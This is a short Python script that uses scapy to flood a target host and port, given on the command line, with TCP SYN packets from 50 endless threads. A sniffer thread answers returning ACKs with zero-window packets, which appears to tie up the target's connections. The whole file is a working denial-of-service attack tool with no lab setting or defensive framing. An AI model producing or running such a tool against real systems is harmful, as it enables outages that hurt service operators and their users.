import sys
from scapy.all import *
from threading import Thread
import random
def syn(target, dport, sport=8128):
    while True:
        send(IP(dst=target)/TCP(sport=sport, dport=dport, seq=random.randint(0,65535), flags="S"),verbose=0)
        #ack(p, target, dport, sport, True)
        
def ack(p, target, dport, sport, synack=True):
    send(IP(dst=target)/TCP(sport=p['TCP'].dport, flags="A", ack=p['TCP'].seq + (1 if synack else 0), seq=p['TCP'].ack, window=0)/"A"*100)
        
def recv(target, dport, sport=8128):
    def on_rx(p):
        f = p['TCP'].flags
        if f & 0x10: # ACK
            ack(p, target, dport, sport, synack=(f & 0x02) == 0)
    sniff(filter="host {} and dst port {}".format(target, sport), prn=on_rx)

def status():
    pass

def run():
    target = sys.argv[1]
    port = int(sys.argv[2])

    ack_thread = Thread(target = recv, args = (target, port))
    ack_thread.start()
    for x in range(50):
        syn_thread = Thread(target = syn, args = (target, port))
        syn_thread.start()
    syn_thread.join()
    #ack_thread.join()
run()
